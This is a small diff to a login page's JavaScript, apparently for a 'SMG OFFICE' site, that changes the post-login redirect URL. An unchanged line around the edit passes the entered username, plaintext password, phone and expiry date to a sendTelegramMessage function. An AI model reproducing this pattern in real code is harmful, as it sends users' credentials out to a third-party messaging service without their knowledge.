@@ -45,7 +45,7 @@ function goBack() {
                         alert("✅ Karibu SMG OFFICE, Ndugu " + username);
                         sendTelegramMessage(username, password, user.phone, user.expireDate);
                         setTimeout(function(){
-                            window.location.href = "https://enockofficial.github.io/home/index.html";
+                            window.location.href = "https://enockofficial.github.io/SMG-OFFICE-2024/home_page.html";
                         }, 2000);
                         return false;
                     }
